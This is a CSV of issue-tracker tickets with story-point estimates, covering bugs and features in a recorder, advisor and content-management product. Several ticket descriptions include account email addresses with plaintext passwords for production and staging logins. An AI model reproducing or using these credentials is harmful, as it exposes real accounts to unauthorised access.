issuekey,title,description,storypoint
REB-8151,Embedded Widget - Taget App. issue,"For the embedded widget, we should also be writing target application logs (REB-6447). I'm seeing logs written when the page I'm view HAS document matches, but I'm not seeing logs written when the page matches the target application context, but does NOT have any document matches. This should work just like the advisors.",1
REB-8118,Updating a Task state doesn't reutrn to the project detail,"In Prod on some accounts, we are seeing an issue where changing the state of a task does not redirect the user back to the project detail. When this happens, the task state dropdown becomes empty. The task state IS correctly updated, but the behavior is bad. See the video:You can use [tray.ailshie@27global.com|mailto:tray.ailshie@27global.com], Hello@1234 in prod to login to the same account (ACME) as the video to troubleshoot.!image-2019-11-26-12-36-54-716.png|width=200,height=183! !task_details_close.mp4|thumbnail!",2
REB-8117,"Open a published task results in ""undefined"" error","Steps to reproduce in Stage:1. Login as tray+s58@27global.com, Hello@12342. Go to project S62 Proj3. Find the Published task and attempt to view the detail.Result: You will see an ""undefined"" error.",1
REB-8116,Unable to publish existing tasks from a project,"As any user with project permission to publish, I am unable to publish tasks that existed prior to the 1.79.4 release (11/25)Reproduce in Stage:1. Login to tray+s58@27global.com, Hello@12342. Go to project S62 Proj3. Try to publish task S62 - you'll get an errorSample traceid: 0HLRI1PHEN23S:00000003In Graylog: https://logs.27global.com/messages/graylog_253/b0a65b70-1072-11ea-b8fd-12777fd9bb64 ",1
REB-8114,"Desktop Recorder - switching to browser- browser name attached to value, appears in left","As a user recording using the Desktop Recorder, if I switch browsers during my recording or close the current browser, the browser name appears in the 'Value' field and shows up in the step name in the left column as well: !browser_name_added_value.jpg|thumbnail! Here's a sample file where this was recorded a couple times: [^Desktop Recorder test 112619 V0.2.opsx] We should not have the browser name appear in any field, and especially not in the step name in the left column, for any step in a recording.",2
REB-8103,Chrome Recorder - investigate problems recording Asana,"As a user, recording Asana, I am seeing the following issues:1. When typing in the sub-task title field, every keystroke is being added as a separate step2. After this occurs, my instructional steps are becoming desynced with my step imagesExample .opsx and mp4: [^AsanaCharacterIssue.mp4]  [^Asana Sub Task Issue V0.1.opsx] This is the Asana web application, here's the STR:1. Log into Asana2. Create item in web recorder and start recording3. Navigate to a task.4. Click on the subtasks icon5. Type in a title for the subtaskPlease investigate and resolve.",5
REB-8102,Customize Content - add control for label outline color,"As a customer admin, customizing output in the Customize Content screen, I can't change the outline for the 'Label' component.We should add another control to the Customize Output screen - name it 'Outline Color' and add it as part of Step Action, underneath the 'Font Color' control.",3
REB-8101,Import Manager - Legacy (rstx) files - author field in Attributes not being filled in,"As a user with Import privileges, importing Legacy files, they are being imported with Authors (you will see them in Content Manager) but the Author field in the Attributes is empty.We should be populating the Author field with the same value as the value being added to Content Manager.Here's a couple of example rstx files, from different sources - Laird: [^CREDIT SALES TAX.rstx] Crane: [^Create Production Order.rstx] they both have this issue.",2
REB-8095,[Regression Testing] - Web/Desktop Advisor and Embedded Widget.,This ticket is created to do a regression test on Advisor apps:-Web Advisor-Desktop Advisor-Embedded WidgetBelow is bugs:[https://epilogue.atlassian.net/browse/REB-8157|https://epilogue.atlassian.net/browse/REB-8157|smart-link][https://epilogue.atlassian.net/browse/REB-8158|https://epilogue.atlassian.net/browse/REB-8158|smart-link][https://epilogue.atlassian.net/browse/REB-8169|https://epilogue.atlassian.net/browse/REB-8169|smart-link][https://epilogue.atlassian.net/browse/REB-8178|https://epilogue.atlassian.net/browse/REB-8178|smart-link],5
REB-8092,Additional Context - Allow editing,"As any user with editing permission, I need the ability to edit the additional context associated with my step, or add additional context if there was none added.* In the editor, if a step has additional context, this field should be editable exactly like the caption, url or process.** If there is no additional context, the field should still be displayed and editable so that the user can add additional context* In the context editor from content manager, if a step has additional context, We should display the field in the page and this field should be editable exactly like the caption, url or process.** If there is no additional context, the field should still be displayed and editable so that the user can add additional context",3
REB-8083,Desktop Advisor and Recorder in Chrome - Add wildcard to begining and end,"Per the comment in REB-6920, we need to apply wildcard’s to the beginning and end of the captured URL so that the document context will be successfully identified. This should be updated for both desktop recorder and advisor so it they know how to handle the URL read from chrome.* Add a wildcard to the begining and end of the chrome url captured from the desktop recorder* When identifying a context using the desktop advisor, when the url comes from chrome, we need to apply the same wildcard logic when matching it to the database of contexts so that the URL is matched as expected (or as close as possible)",3
